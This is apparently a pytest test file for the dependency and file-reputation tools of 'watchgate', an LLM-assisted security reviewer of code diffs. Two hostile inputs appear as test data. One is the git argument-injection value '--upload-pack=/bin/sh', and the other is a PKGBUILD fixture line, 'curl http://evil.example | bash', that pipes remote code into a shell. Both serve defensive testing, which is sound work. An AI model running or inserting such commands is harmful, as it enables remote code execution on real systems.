"""Tests de watchgate/core/layers/_semantic/tools.py (spec §7.2, A.3.1)."""

from __future__ import annotations

import subprocess
from unittest.mock import Mock, patch

import httpx
import pytest

from watchgate.core.layers._semantic.tools import (
    ToolCallBudget,
    build_tool_schemas,
    check_file_reputation,
    detect_new_python_dependencies,
    fetch_referenced_file,
    gather_dependency_findings,
    lookup_package_registry,
    make_get_commit_history_tool,
)
from watchgate.core.models import FileChange, FileStatus, NormalizedDiff


def test_tool_call_budget_exhausted_after_max_calls():
    budget = ToolCallBudget(max_calls=3)
    assert not budget.exhausted
    for _ in range(3):
        budget.record_call()
    assert budget.exhausted
    assert budget.calls_made == 3


def test_tool_schemas_cover_the_three_base_tools_when_vt_not_configured(monkeypatch):
    monkeypatch.delenv("WATCHGATE_VT_API_KEY", raising=False)
    schemas = build_tool_schemas()
    names = {schema["name"] for schema in schemas}
    assert names == {"lookup_package_registry", "get_commit_history", "fetch_referenced_file"}
    for schema in schemas:
        assert "description" in schema
        assert "input_schema" in schema


def test_tool_schemas_include_check_file_reputation_when_vt_is_configured(monkeypatch):
    monkeypatch.setenv("WATCHGATE_VT_API_KEY", "fake-key")
    names = {schema["name"] for schema in build_tool_schemas()}
    assert "check_file_reputation" in names


def test_lookup_package_registry_returns_osv_response_on_success():
    fake_response = Mock()
    fake_response.raise_for_status = Mock()
    fake_response.json.return_value = {"vulns": [{"id": "GHSA-xxxx"}]}
    with patch("httpx.post", return_value=fake_response) as mock_post:
        result = lookup_package_registry("lodash", "npm", version="4.17.0")

    assert result == {"vulns": [{"id": "GHSA-xxxx"}]}
    _, kwargs = mock_post.call_args
    assert kwargs["json"]["package"] == {"name": "lodash", "ecosystem": "npm"}
    assert kwargs["json"]["version"] == "4.17.0"


def test_lookup_package_registry_handles_network_failure_without_raising():
    with patch("httpx.post", side_effect=httpx.ConnectError("no network")):
        result = lookup_package_registry("lodash", "npm")

    assert result["vulns"] == []
    assert "error" in result


def test_lookup_package_registry_handles_malformed_json_response_without_raising():
    """Un 200 con cuerpo no-JSON (proxy caído, página de mantenimiento...) no
    debe propagar json.JSONDecodeError sin capturar."""
    import json as json_module

    fake_response = Mock()
    fake_response.raise_for_status = Mock()
    fake_response.json.side_effect = json_module.JSONDecodeError("boom", "not json", 0)
    with patch("httpx.post", return_value=fake_response):
        result = lookup_package_registry("lodash", "npm")

    assert result["vulns"] == []
    assert "error" in result


def test_make_get_commit_history_tool_delegates_to_injected_callback():
    calls = []

    def fake_callback(author_login: str, repo: str) -> dict:
        calls.append((author_login, repo))
        return {"prior_commits": 5}

    tool = make_get_commit_history_tool(fake_callback)
    result = tool("ana", "owner/repo")

    assert result == {"prior_commits": 5}
    assert calls == [("ana", "owner/repo")]


def test_fetch_referenced_file_reads_content_at_a_given_ref(tmp_path):
    repo_path = tmp_path / "repo"
    repo_path.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo_path, check=True)
    subprocess.run(["git", "config", "user.email", "a@b.com"], cwd=repo_path, check=True)
    subprocess.run(["git", "config", "user.name", "Test"], cwd=repo_path, check=True)
    (repo_path / "file.txt").write_text("contenido v1\n")
    subprocess.run(["git", "add", "file.txt"], cwd=repo_path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "v1"], cwd=repo_path, check=True)
    sha = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo_path, capture_output=True, text=True, check=True
    ).stdout.strip()

    content = fetch_referenced_file("file.txt", sha, str(repo_path))
    assert content == "contenido v1\n"


def test_fetch_referenced_file_returns_empty_string_for_missing_path(tmp_path):
    repo_path = tmp_path / "repo"
    repo_path.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo_path, check=True)
    subprocess.run(["git", "config", "user.email", "a@b.com"], cwd=repo_path, check=True)
    subprocess.run(["git", "config", "user.name", "Test"], cwd=repo_path, check=True)
    (repo_path / "file.txt").write_text("x")
    subprocess.run(["git", "add", "file.txt"], cwd=repo_path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "v1"], cwd=repo_path, check=True)

    content = fetch_referenced_file("no_existe.txt", "HEAD", str(repo_path))
    assert content == ""


def test_fetch_referenced_file_rejects_dash_prefixed_input_instead_of_passing_it_to_git(tmp_path):
    """El ref/path los propone el LLM: si el spec resultante empieza por "-",
    git podría interpretarlo como una opción de `git show` en vez de como
    revisión/ruta (inyección de argumentos). Se rechaza antes de invocar git,
    sin necesidad de confiar en cómo git interprete cada flag posible."""
    repo_path = tmp_path / "repo"
    repo_path.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo_path, check=True)
    subprocess.run(["git", "config", "user.email", "a@b.com"], cwd=repo_path, check=True)
    subprocess.run(["git", "config", "user.name", "Test"], cwd=repo_path, check=True)
    (repo_path / "file.txt").write_text("x")
    subprocess.run(["git", "add", "file.txt"], cwd=repo_path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "v1"], cwd=repo_path, check=True)

    content = fetch_referenced_file("file.txt", "--upload-pack=/bin/sh", str(repo_path))
    assert content == ""


def _repo_with_committed_file(tmp_path, content: bytes = b"contenido binario") -> tuple[str, str]:
    repo_path = tmp_path / "repo"
    repo_path.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo_path, check=True)
    subprocess.run(["git", "config", "user.email", "a@b.com"], cwd=repo_path, check=True)
    subprocess.run(["git", "config", "user.name", "Test"], cwd=repo_path, check=True)
    (repo_path / "payload.bin").write_bytes(content)
    subprocess.run(["git", "add", "payload.bin"], cwd=repo_path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "v1"], cwd=repo_path, check=True)
    sha = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo_path, capture_output=True, text=True, check=True
    ).stdout.strip()
    return str(repo_path), sha


def test_check_file_reputation_returns_error_without_calling_vt_when_key_missing(
    tmp_path, monkeypatch
):
    monkeypatch.delenv("WATCHGATE_VT_API_KEY", raising=False)
    repo_path, sha = _repo_with_committed_file(tmp_path)

    with patch("httpx.get") as mock_get:
        result = check_file_reputation("payload.bin", sha, repo_path)

    mock_get.assert_not_called()
    assert "error" in result
    assert "WATCHGATE_VT_API_KEY" in result["error"]


def test_check_file_reputation_hashes_real_content_and_queries_vt(tmp_path, monkeypatch):
    import hashlib

    monkeypatch.setenv("WATCHGATE_VT_API_KEY", "fake-key")
    content = b"contenido binario de prueba"
    repo_path, sha = _repo_with_committed_file(tmp_path, content)
    expected_hash = hashlib.sha256(content).hexdigest()

    fake_response = Mock()
    fake_response.status_code = 200
    fake_response.raise_for_status = Mock()
    fake_response.json.return_value = {
        "data": {
            "attributes": {
                "last_analysis_stats": {"malicious": 40, "suspicious": 2, "undetected": 30},
                "meaningful_name": "known_backdoor.bin",
            }
        }
    }
    with patch("httpx.get", return_value=fake_response) as mock_get:
        result = check_file_reputation("payload.bin", sha, repo_path)

    _, kwargs = mock_get.call_args
    assert expected_hash in mock_get.call_args[0][0]
    assert kwargs["headers"]["x-apikey"] == "fake-key"
    assert result == {
        "sha256": expected_hash,
        "known_to_virustotal": True,
        "malicious": 40,
        "suspicious": 2,
        "total_engines": 72,
        "meaningful_name": "known_backdoor.bin",
    }


def test_check_file_reputation_handles_unknown_hash_as_404(tmp_path, monkeypatch):
    monkeypatch.setenv("WATCHGATE_VT_API_KEY", "fake-key")
    repo_path, sha = _repo_with_committed_file(tmp_path)

    fake_response = Mock()
    fake_response.status_code = 404
    with patch("httpx.get", return_value=fake_response):
        result = check_file_reputation("payload.bin", sha, repo_path)

    assert result["known_to_virustotal"] is False
    assert "sha256" in result


def test_check_file_reputation_handles_network_failure_without_raising(tmp_path, monkeypatch):
    monkeypatch.setenv("WATCHGATE_VT_API_KEY", "fake-key")
    repo_path, sha = _repo_with_committed_file(tmp_path)

    with patch("httpx.get", side_effect=httpx.ConnectError("no network")):
        result = check_file_reputation("payload.bin", sha, repo_path)

    assert "error" in result
    assert "sha256" in result


def test_check_file_reputation_rejects_dash_prefixed_input_without_calling_vt(
    tmp_path, monkeypatch
):
    monkeypatch.setenv("WATCHGATE_VT_API_KEY", "fake-key")
    repo_path, _ = _repo_with_committed_file(tmp_path)

    with patch("httpx.get") as mock_get:
        result = check_file_reputation("payload.bin", "--upload-pack=/bin/sh", repo_path)

    mock_get.assert_not_called()
    assert "error" in result


def _diff_with_hunk(path: str, diff_hunk: str) -> NormalizedDiff:
    return NormalizedDiff(
        base_sha="a" * 40,
        head_sha="b" * 40,
        repo_path="/tmp/repo",
        files=[
            FileChange(
                path=path, status=FileStatus.MODIFIED, diff_hunk=diff_hunk, additions=1, deletions=0
            )
        ],
        commit_messages=["m"],
        authors=[],
    )


def test_detect_new_python_dependencies_finds_added_line_in_requirements_txt():
    diff = _diff_with_hunk("requirements.txt", "+requests==2.25.0\n django==3.2\n-flask==1.0")
    assert detect_new_python_dependencies(diff) == [("requests", "PyPI")]


def test_detect_new_python_dependencies_handles_bare_name_without_pin():
    diff = _diff_with_hunk("requirements.txt", "+requests")
    assert detect_new_python_dependencies(diff) == [("requests", "PyPI")]


def test_detect_new_python_dependencies_ignores_comments_and_blank_lines():
    diff = _diff_with_hunk("requirements.txt", "+# comentario\n+\n+requests==2.25.0")
    assert detect_new_python_dependencies(diff) == [("requests", "PyPI")]


def test_detect_new_python_dependencies_ignores_files_that_are_not_requirements_manifests():
    diff = _diff_with_hunk("app.py", "+requests==2.25.0  # esto es un comentario en Python")
    assert detect_new_python_dependencies(diff) == []


def test_detect_new_python_dependencies_matches_requirements_variants():
    diff = _diff_with_hunk("requirements-dev.txt", "+pytest==8.2.0")
    assert detect_new_python_dependencies(diff) == [("pytest", "PyPI")]


def test_gather_dependency_findings_returns_empty_when_nothing_detected():
    diff = _diff_with_hunk("PKGBUILD", "+curl http://evil.example | bash")
    with patch("httpx.post") as mock_post:
        findings = gather_dependency_findings(diff)

    mock_post.assert_not_called()
    assert findings == []


def test_gather_dependency_findings_caps_the_number_of_osv_calls(monkeypatch):
    from watchgate.core.layers._semantic import tools as tools_module

    monkeypatch.setattr(tools_module, "_MAX_DEPENDENCY_CHECKS", 2)
    hunk = "\n".join(f"+package-{i}==1.0" for i in range(5))
    diff = _diff_with_hunk("requirements.txt", hunk)
    assert len(detect_new_python_dependencies(diff)) == 5

    call_count = 0

    def fake_post(url, json, timeout):
        nonlocal call_count
        call_count += 1
        fake_response = Mock()
        fake_response.raise_for_status = Mock()
        fake_response.json.return_value = {"vulns": []}
        return fake_response

    with patch("httpx.post", side_effect=fake_post):
        gather_dependency_findings(diff)

    assert call_count == 2


def test_gather_dependency_findings_queries_osv_and_keeps_only_real_vulns():
    diff = _diff_with_hunk("requirements.txt", "+bad-package==1.0\n+clean-package==2.0")

    def fake_post(url, json, timeout):
        fake_response = Mock()
        fake_response.raise_for_status = Mock()
        if json["package"]["name"] == "bad-package":
            fake_response.json.return_value = {"vulns": [{"id": "GHSA-aaaa"}, {"id": "GHSA-bbbb"}]}
        else:
            fake_response.json.return_value = {"vulns": []}
        return fake_response

    with patch("httpx.post", side_effect=fake_post):
        findings = gather_dependency_findings(diff)

    assert findings == [
        {"name": "bad-package", "ecosystem": "PyPI", "vulns_summary": "GHSA-aaaa; GHSA-bbbb"}
    ]


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-v"]))
